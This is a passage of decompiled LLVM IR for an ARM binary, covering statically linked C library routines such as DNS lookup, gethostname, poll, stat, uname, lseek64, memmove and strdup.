  %v2_207dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_207dc, i32* %r2.global-to-local, align 4
  %v2_207e0 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_207e0, i32* %r3.global-to-local, align 4
  %v7_207ec = inttoptr i32 %v0_207d4 to i8*
  %v8_207ec = call i32 @__dns_lookup(i8* %v7_207ec, i32 1, i32 %v2_207dc, i32 %v2_207e0)
  store i32 %v8_207ec, i32* %r0.global-to-local, align 4
  %v1_207f0 = icmp slt i32 %v8_207ec, 0
  br i1 %v1_207f0, label %dec_label_pc_207f8, label %dec_label_pc_2080c

dec_label_pc_207f8:                               ; preds = %dec_label_pc_207c8, %dec_label_pc_207bc
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_20698, align 4
  br label %dec_label_pc_20928

dec_label_pc_2080c:                               ; preds = %dec_label_pc_207c8
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v7_20810 = icmp eq i32 %tmp10, 1
  br i1 %v7_20810, label %dec_label_pc_20818, label %dec_label_pc_208f0

dec_label_pc_20818:                               ; preds = %dec_label_pc_2080c
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_20830 = load i32, i32* @r5, align 4
  %v2_20830 = add i32 %v0_20830, -12
  store i32 %v2_20830, i32* @r8, align 4
  %v8_20830 = icmp slt i32 %v2_20830, 0
  br i1 %v8_20830, label %bb35, label %dec_label_pc_2083c

bb35:                                             ; preds = %dec_label_pc_20818
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_20910

dec_label_pc_2083c:                               ; preds = %dec_label_pc_20818
  %v0_2083c = load i32, i32* @r6, align 4
  store i32 %v0_2083c, i32* @r1, align 4
  %v2_20840 = add i32 %v0_2083c, 12
  store i32 %v2_20840, i32* @r0, align 4
  %v2_20844 = call i32 @memmove(i32 %v2_20840, i32 %v0_2083c)
  %v0_20848 = load i32, i32* @sb, align 4
  %v1_20848 = add i32 %v0_20848, 4
  store i32 %v1_20848, i32* @r3, align 4
  %v1_2084c = load i32, i32* @r4, align 4
  %v2_2084c = add i32 %v1_2084c, %v1_20848
  store i32 %v2_2084c, i32* @r5, align 4
  store i32 %v2_2084c, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_2085c = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_20868.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_20868

dec_label_pc_20868:                               ; preds = %dec_label_pc_2083c, %dec_label_pc_20868
  %v0_20868 = phi i32 [ %v0_20868.pre, %dec_label_pc_2083c ], [ %v1_2086c, %dec_label_pc_20868 ]
  %v1_20868 = load i32, i32* @r6, align 4
  %v7_20868 = inttoptr i32 %v1_20868 to i32*
  store i32 %v0_20868, i32* %v7_20868, align 4
  %v0_2086c = load i32, i32* @r5, align 4
  %v1_2086c = add i32 %v0_2086c, 4
  store i32 %v1_2086c, i32* @r5, align 4
  %v0_20870 = load i32, i32* %r0.global-to-local, align 4
  %v1_20870 = add i32 %v0_20870, 1
  store i32 %v1_20870, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_20878 = icmp eq i32 %v1_20870, 0
  br i1 %v9_20878, label %dec_label_pc_20868, label %dec_label_pc_20880

dec_label_pc_20880:                               ; preds = %dec_label_pc_20868
  %v3_20880 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_20880, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_20888 = icmp eq i32 %v3_20880, 0
  %v1_2088c = load i32, i32* @r6, align 4
  %v5_2088c = mul i32 %v1_20870, 4
  %v6_2088c = add i32 %v1_2088c, %v5_2088c
  %v7_2088c = inttoptr i32 %v6_2088c to i32*
  store i32 0, i32* %v7_2088c, align 4
  br i1 %v2_20888, label %dec_label_pc_208bc, label %dec_label_pc_20894

dec_label_pc_20894:                               ; preds = %dec_label_pc_20880
  %v0_20894 = load i32, i32* @r4, align 4
  %v1_20894 = inttoptr i32 %v0_20894 to i8*
  store i32 %v0_20894, i32* %r0.global-to-local, align 4
  %v3_20898 = call i32 @strlen(i8* %v1_20894)
  store i32 %v3_20898, i32* %r0.global-to-local, align 4
  %v0_2089c = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_2089c, %v3_20898
  br i1 %tmp, label %dec_label_pc_208a4, label %dec_label_pc_208bc

dec_label_pc_208a4:                               ; preds = %dec_label_pc_20894
  %v0_208a4 = load i32, i32* @r4, align 4
  store i32 %v0_208a4, i32* @r1, align 4
  %v0_208a8 = load i32, i32* @r5, align 4
  store i32 %v0_208a8, i32* %r0.global-to-local, align 4
  %v2_208ac = inttoptr i32 %v0_208a8 to i8*
  %v3_208ac = call i32 @strcpy(i8* %v2_208ac, i32 %v0_208a4)
  store i32 %v3_208ac, i32* %r0.global-to-local, align 4
  %v0_208b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_208bc

dec_label_pc_208bc:                               ; preds = %dec_label_pc_20894, %dec_label_pc_20880, %dec_label_pc_208a4
  %storemerge1 = phi i32 [ %v0_208b0, %dec_label_pc_208a4 ], [ %v0_20628, %dec_label_pc_20894 ], [ %v0_20628, %dec_label_pc_20880 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  %v3_208bc = load i32, i32* %stack_var_0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_208c4 = load i32, i32* @r7, align 4
  %v2_208c4 = inttoptr i32 %v3_208bc to i32*
  store i32 %v0_208c4, i32* %v2_208c4, align 4
  store i32 %tmp17, i32* @ip, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_208d0 = load i32, i32* @r7, align 4
  %v2_208d0 = add i32 %v1_208d0, 8
  %v3_208d0 = inttoptr i32 %v2_208d0 to i32*
  store i32 2, i32* %v3_208d0, align 4
  %v0_208d4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_208d4, i32* @r5, align 4
  %v0_208d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_208d8 = mul i32 %v0_208d8, 2
  store i32 %v2_208d8, i32* %r2.global-to-local, align 4
  %v1_208dc = load i32, i32* @r7, align 4
  %v2_208dc = add i32 %v1_208dc, 12
  %v3_208dc = inttoptr i32 %v2_208dc to i32*
  store i32 %v2_208d8, i32* %v3_208dc, align 4
  %v0_208e0 = load i32, i32* @r7, align 4
  %v1_208e0 = inttoptr i32 %v0_208e0 to i32*
  %v2_208e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_208e0, i32* %v1_208e0, align 4
  %v3_208e0 = add i32 %v0_208e0, 4
  %v4_208e0 = inttoptr i32 %v3_208e0 to i32*
  %v5_208e0 = load i32, i32* @sb, align 4
  store i32 %v5_208e0, i32* %v4_208e0, align 4
  %v0_208e4 = load i32, i32* @r6, align 4
  %v1_208e4 = load i32, i32* @r7, align 4
  %v2_208e4 = add i32 %v1_208e4, 16
  %v3_208e4 = inttoptr i32 %v2_208e4 to i32*
  store i32 %v0_208e4, i32* %v3_208e4, align 4
  %v0_208e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_208e8 = load i32, i32* @ip, align 4
  %v2_208e8 = inttoptr i32 %v1_208e8 to i32*
  store i32 %v0_208e8, i32* %v2_208e8, align 4
  br label %dec_label_pc_20910

dec_label_pc_208f0:                               ; preds = %dec_label_pc_2080c
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_20698, align 4
  store i32 %v0_206ec, i32* @ip, align 4
  %v3_20904 = load i32, i32* @global_var_32044.1421, align 4
  store i32 %v3_20904, i32* %r3.global-to-local, align 4
  %v0_20908 = load i32, i32* %r2.global-to-local, align 4
  %v3_20908 = add i32 %v3_20904, %v0_206ec
  %v4_20908 = inttoptr i32 %v3_20908 to i32*
  store i32 %v0_20908, i32* %v4_20908, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_20910

dec_label_pc_20910:                               ; preds = %bb35, %dec_label_pc_208bc, %dec_label_pc_208f0
  %v3_20910 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_20910, i32* @r0, align 4
  %v0_20914 = call i32 @free()
  %v3_20918 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_20918, i32* @r0, align 4
  %v0_2091c = call i32 @free()
  store i32 %v0_2091c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_20928

dec_label_pc_20924:                               ; preds = %dec_label_pc_206e8, %dec_label_pc_2071c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_20928

dec_label_pc_20928:                               ; preds = %bb, %.thread4, %dec_label_pc_206cc, %dec_label_pc_206ac, %dec_label_pc_20910, %dec_label_pc_207f8, %dec_label_pc_20780, %dec_label_pc_20924
  %v0_20928 = load i32, i32* @r5, align 4
  store i32 %v0_20928, i32* %r0.global-to-local, align 4
  ret i32 %v0_20928

; uselistorder directives
  uselistorder i32 %v2_208d8, { 1, 0 }
  uselistorder i32 %v0_20894, { 1, 0 }
  uselistorder i32 %v1_20870, { 0, 2, 1 }
  uselistorder i32 %v1_2086c, { 1, 0 }
  uselistorder i32 %v0_2083c, { 1, 0, 2 }
  uselistorder i32 %v2_20830, { 1, 0 }
  uselistorder i32 %v1_2073c, { 2, 1, 0 }
  uselistorder i32 %v1_20730, { 1, 0 }
  uselistorder i32 %v0_20708, { 1, 0 }
  uselistorder i32 %v0_206ec, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_20698, { 1, 0, 2 }
  uselistorder i32 %v0_20640, { 1, 0, 2 }
  uselistorder i32 %v0_20628, { 1, 2, 3, 5, 4, 0, 6, 7 }
  uselistorder i32 %v0_20620, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32 %tmp17, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 19, 20, 4, 3, 6, 5, 8, 7, 0, 10, 9, 12, 11, 13, 15, 14, 17, 16, 18 }
  uselistorder i32 ()* @free, { 22, 21, 20, 19, 18, 17, 11, 10, 9, 8, 7, 6, 16, 15, 14, 13, 5, 4, 3, 2, 12, 23, 30, 29, 28, 1, 27, 26, 25, 24, 0 }
  uselistorder i32* @global_var_32044.1421, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_20928, { 7, 4, 5, 6, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_20924, { 1, 0 }
  uselistorder label %dec_label_pc_20910, { 2, 1, 0 }
  uselistorder label %dec_label_pc_208bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20868, { 1, 0 }
  uselistorder label %dec_label_pc_206e8, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_20950 = load i32, i32* @r1, align 4
  %v2_20950 = icmp eq i32 %v0_20950, 0
  %v3_20954 = load i32, i32* @r4, align 4
  store i32 %v3_20954, i32* %stack_var_-8, align 4
  %v0_20958 = load i32, i32* @r0, align 4
  store i32 %v0_20958, i32* %r4.global-to-local, align 4
  br i1 %v2_20950, label %dec_label_pc_2097c, label %dec_label_pc_20960

dec_label_pc_20960:                               ; preds = %entry
  %v1_20968 = add i32 %v0_20958, 260
  %v4_2096c = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_20968)
  %v2_20970 = icmp eq i32 %v4_2096c, 0
  br i1 %v2_20970, label %dec_label_pc_20980, label %dec_label_pc_2097c

dec_label_pc_2097c:                               ; preds = %dec_label_pc_20960, %entry
  br label %dec_label_pc_20980

dec_label_pc_20980:                               ; preds = %dec_label_pc_20960, %dec_label_pc_2097c
  %storemerge = phi i32 [ 0, %dec_label_pc_2097c ], [ 1, %dec_label_pc_20960 ]
  %v1_20984 = load i32, i32* %r4.global-to-local, align 4
  %v2_20984 = add i32 %v1_20984, 256
  %v3_20984 = inttoptr i32 %v2_20984 to i32*
  store i32 %storemerge, i32* %v3_20984, align 4
  %v2_20988 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_20988, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 3, 0, 1, 4, 5, 2 }
  uselistorder i32* null, { 7, 2, 3, 0, 4, 1, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 18, 21, 22, 23, 24, 25, 26, 32, 33, 30, 31, 29, 28, 27, 34, 35, 36, 6 }
  uselistorder label %dec_label_pc_20980, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_2099c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_209a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_209a8, i32* %r5.global-to-local, align 4
  %v1_209ac = call i32 @uname(i32 %v2_2099c)
  %v7_209b0 = icmp eq i32 %v1_209ac, -1
  br i1 %v7_209b0, label %bb, label %dec_label_pc_209bc

bb:                                               ; preds = %entry
  store i32 %v1_209ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20a00

dec_label_pc_209bc:                               ; preds = %entry
  %v2_209bc = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_209c4 = call i32 @strlen(i8* %tmp10)
  %v1_209c8 = add i32 %v3_209c4, 1
  %v1_209cc = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_209c8, %v1_209cc
  br i1 %tmp, label %dec_label_pc_209d4, label %dec_label_pc_209f0

dec_label_pc_209d4:                               ; preds = %dec_label_pc_209bc
  %v0_209d8 = call i32 @__aeabi_read_tp()
  %v3_209dc = load i16, i16* @global_var_32088.1320, align 2
  %v4_209dc = sext i16 %v3_209dc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_209e8 = add i32 %v4_209dc, %v0_209d8
  %v4_209e8 = inttoptr i32 %v3_209e8 to i32*
  store i32 22, i32* %v4_209e8, align 4
  %v0_20a00.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20a00

dec_label_pc_209f0:                               ; preds = %dec_label_pc_209bc
  store i32 %v2_209bc, i32* @r1, align 4
  %v0_209f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_209f8 = inttoptr i32 %v0_209f4 to i8*
  %v3_209f8 = call i32 @strcpy(i8* %v2_209f8, i32 %v2_209bc)
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20a00

dec_label_pc_20a00:                               ; preds = %bb, %dec_label_pc_209d4, %dec_label_pc_209f0
  %v0_20a00 = phi i32 [ %v1_209ac, %bb ], [ %v0_20a00.pre, %dec_label_pc_209d4 ], [ 0, %dec_label_pc_209f0 ]
  ret i32 %v0_20a00

; uselistorder directives
  uselistorder i32 %v2_209bc, { 1, 0 }
  uselistorder i32 %v1_209ac, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 4, 0, 1, 2, 3, 8, 9 }
  uselistorder i32 22, { 3, 15, 4, 17, 5, 18, 0, 16, 6, 7, 8, 9, 13, 10, 11, 19, 12, 1, 2, 14 }
  uselistorder label %dec_label_pc_20a00, { 2, 1, 0 }
}

define i32 @__syscall_poll() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_20a14 = load i32, i32* @r7, align 4
  store i32 %v3_20a14, i32* %stack_var_-8, align 4
  %v0_20a20 = load i32, i32* @r0, align 4
  store i32 %v0_20a20, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_20a20, -4095
  br i1 %tmp, label %dec_label_pc_20a48, label %dec_label_pc_20a30

dec_label_pc_20a30:                               ; preds = %entry
  %v0_20a34 = call i32 @__aeabi_read_tp()
  %v3_20a38 = load i16, i16* @global_var_32088.1320, align 2
  %v4_20a38 = sext i16 %v3_20a38 to i32
  %v0_20a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_20a3c = sub i32 0, %v0_20a3c
  store i32 %v1_20a3c, i32* %r2.global-to-local, align 4
  %v3_20a40 = add i32 %v4_20a38, %v0_20a34
  %v4_20a40 = inttoptr i32 %v3_20a40 to i32*
  store i32 %v1_20a3c, i32* %v4_20a40, align 4
  %v2_20a48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_20a48

dec_label_pc_20a48:                               ; preds = %entry, %dec_label_pc_20a30
  %v1_20a4c = phi i32 [ %v0_20a20, %entry ], [ -1, %dec_label_pc_20a30 ]
  %v2_20a48 = phi i32 [ %v3_20a14, %entry ], [ %v2_20a48.pre, %dec_label_pc_20a30 ]
  store i32 %v2_20a48, i32* @r7, align 4
  ret i32 %v1_20a4c

; uselistorder directives
  uselistorder i32 %v0_20a20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_20a48, { 1, 0 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_20a58 = load i32, i32* @r4, align 4
  store i32 %v3_20a58, i32* %stack_var_-20, align 4
  %v6_20a58 = load i32, i32* @r5, align 4
  %v9_20a58 = load i32, i32* @r6, align 4
  %v12_20a58 = load i32, i32* @r7, align 4
  %v4_20a64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_20a68 = icmp eq i32 %v4_20a64, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_20a68, label %dec_label_pc_20a80, label %entry.dec_label_pc_20a8c_crit_edge

entry.dec_label_pc_20a8c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_20a8c

dec_label_pc_20a80:                               ; preds = %entry
  store i32 %v3_20a58, i32* @r4, align 4
  store i32 %v9_20a58, i32* @r6, align 4
  store i32 %v12_20a58, i32* @r7, align 4
  %v0_20a88 = call i32 @__syscall_poll()
  br label %dec_label_pc_20a8c

dec_label_pc_20a8c:                               ; preds = %entry.dec_label_pc_20a8c_crit_edge, %dec_label_pc_20a80
  %v0_20a8c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_20a8c, i32* @r5, align 4
  %v0_20a9c = load i32, i32* @r4, align 4
  store i32 %v0_20a9c, i32* @r0, align 4
  %v0_20aa0 = call i32 @__syscall_poll()
  store i32 %v0_20aa0, i32* @r4, align 4
  %v0_20aa8 = load i32, i32* @r5, align 4
  %v1_20aac = call i32 @__libc_disable_asynccancel(i32 %v0_20aa8)
  %v0_20ab0 = load i32, i32* @r4, align 4
  %v2_20ab8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_20ab8, i32* @r4, align 4
  store i32 %v6_20a58, i32* @r5, align 4
  store i32 %v9_20a58, i32* @r6, align 4
  store i32 %v12_20a58, i32* @r7, align 4
  ret i32 %v0_20ab0

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 11, 14, 13, 1, 4, 3, 6, 12, 5, 8, 9, 0, 7, 10, 2 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 11, 14, 13, 1, 4, 3, 6, 12, 5, 8, 9, 0, 7, 10, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_20a8c, { 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 195, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_20b08, label %dec_label_pc_20aec

dec_label_pc_20aec:                               ; preds = %entry
  %v0_20af0 = call i32 @__aeabi_read_tp()
  %v3_20af4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_20af4 = sext i16 %v3_20af4 to i32
  %v0_20af8 = load i32, i32* %r2.global-to-local, align 4
  %v1_20af8 = sub i32 0, %v0_20af8
  store i32 %v1_20af8, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_20b00 = add i32 %v4_20af4, %v0_20af0
  %v4_20b00 = inttoptr i32 %v3_20b00 to i32*
  store i32 %v1_20af8, i32* %v4_20b00, align 4
  br label %dec_label_pc_20b18

dec_label_pc_20b08:                               ; preds = %entry
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v2_20b08 = icmp eq i32 %arg1, 0
  br i1 %v2_20b08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_20b08
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_20b08, %bb
  call void @__pseudo_cond_branch(i1 %v2_20b08, i32 ptrtoint (i32* @global_var_1e97c.1803 to i32))
  br label %dec_label_pc_20b18

dec_label_pc_20b18:                               ; preds = %dec_label_pc_20aec, %.thread
  %v0_20b18 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_20b18

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 195, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_20b18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_20b2c = load i32, i32* @r7, align 4
  store i32 %v3_20b2c, i32* %stack_var_-8, align 4
  %v0_20b38 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_20b38, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_20b38, -4095
  br i1 %tmp, label %dec_label_pc_20b60, label %dec_label_pc_20b48

dec_label_pc_20b48:                               ; preds = %entry
  %v0_20b4c = call i32 @__aeabi_read_tp()
  %v3_20b50 = load i16, i16* @global_var_32088.1320, align 2
  %v4_20b50 = sext i16 %v3_20b50 to i32
  %v0_20b54 = load i32, i32* %r2.global-to-local, align 4
  %v1_20b54 = sub i32 0, %v0_20b54
  store i32 %v1_20b54, i32* %r2.global-to-local, align 4
  %v3_20b58 = add i32 %v4_20b50, %v0_20b4c
  %v4_20b58 = inttoptr i32 %v3_20b58 to i32*
  store i32 %v1_20b54, i32* %v4_20b58, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_20b60.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_20b60

dec_label_pc_20b60:                               ; preds = %entry, %dec_label_pc_20b48
  %v1_20b64 = phi i32 [ %v0_20b38, %entry ], [ -1, %dec_label_pc_20b48 ]
  %v2_20b60 = phi i32 [ %v3_20b2c, %entry ], [ %v2_20b60.pre, %dec_label_pc_20b48 ]
  store i32 %v2_20b60, i32* @r7, align 4
  ret i32 %v1_20b64

; uselistorder directives
  uselistorder i32 %v0_20b38, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20b60, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_20bb4, label %dec_label_pc_20b98

dec_label_pc_20b98:                               ; preds = %entry
  %v0_20b9c = call i32 @__aeabi_read_tp()
  %v3_20ba0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_20ba0 = sext i16 %v3_20ba0 to i32
  %v0_20ba4 = load i32, i32* %r2.global-to-local, align 4
  %v1_20ba4 = sub i32 0, %v0_20ba4
  store i32 %v1_20ba4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_20bac = add i32 %v4_20ba0, %v0_20b9c
  %v4_20bac = inttoptr i32 %v3_20bac to i32*
  store i32 %v1_20ba4, i32* %v4_20bac, align 4
  %v0_20bbc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20bbc

dec_label_pc_20bb4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_20bb4 = icmp eq i32 %arg1, 0
  br i1 %v2_20bb4, label %dec_label_pc_20bc8, label %dec_label_pc_20bbc

dec_label_pc_20bbc:                               ; preds = %dec_label_pc_20bb4, %dec_label_pc_20b98
  %v0_20bbc = phi i32 [ %arg1, %dec_label_pc_20bb4 ], [ %v0_20bbc.pre, %dec_label_pc_20b98 ]
  %v3_20bc0 = ashr i32 %v0_20bbc, 31
  br label %dec_label_pc_20bcc

dec_label_pc_20bc8:                               ; preds = %dec_label_pc_20bb4
  br label %dec_label_pc_20bcc

dec_label_pc_20bcc:                               ; preds = %dec_label_pc_20bbc, %dec_label_pc_20bc8
  %v1_20bd4 = phi i32 [ %v0_20bbc, %dec_label_pc_20bbc ], [ %tmp8, %dec_label_pc_20bc8 ]
  %storemerge = phi i32 [ %v3_20bc0, %dec_label_pc_20bbc ], [ %tmp, %dec_label_pc_20bc8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_20bd4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_20bcc, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_20be0 = load i32, i32* @r0, align 4
  %v1_20be0 = load i32, i32* @r1, align 4
  %v2_20be0 = inttoptr i32 %v0_20be0 to i8*
  %v3_20be0 = call i32 @_memcpy(i8* %v2_20be0, i32 %v1_20be0)
  ret i32 %v3_20be0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_20bf0 = load i32, i32* @r4, align 4
  store i32 %v3_20bf0, i32* %stack_var_-16, align 4
  %v9_20bf0 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_20bf8 = call i32 @strlen(i8* %arg1)
  %v1_20bfc = add i32 %v3_20bf8, 1
  store i32 %v1_20bfc, i32* @r4, align 4
  %v1_20c04 = call i32 @malloc(i32 %v1_20bfc)
  store i32 %v1_20c04, i32* %r5.global-to-local, align 4
  %v2_20c08 = icmp eq i32 %v1_20c04, 0
  br i1 %v2_20c08, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_20c14 = xor i1 %v2_20c08, true
  call void @__pseudo_cond_branch(i1 %v1_20c14, i32 ptrtoint (i32* @global_var_15be0.1615 to i32))
  %v0_20c18 = load i32, i32* %r5.global-to-local, align 4
  %v2_20c1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_20c1c, i32* @r4, align 4
  store i32 %v9_20bf0, i32* @r6, align 4
  ret i32 %v0_20c18

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 13, 12, 11, 5, 4, 10, 9, 8, 14, 7, 6, 3, 23, 1, 22, 21, 20, 19, 18, 17, 16, 15, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_20c28 = load i32, i32* @lr, align 4
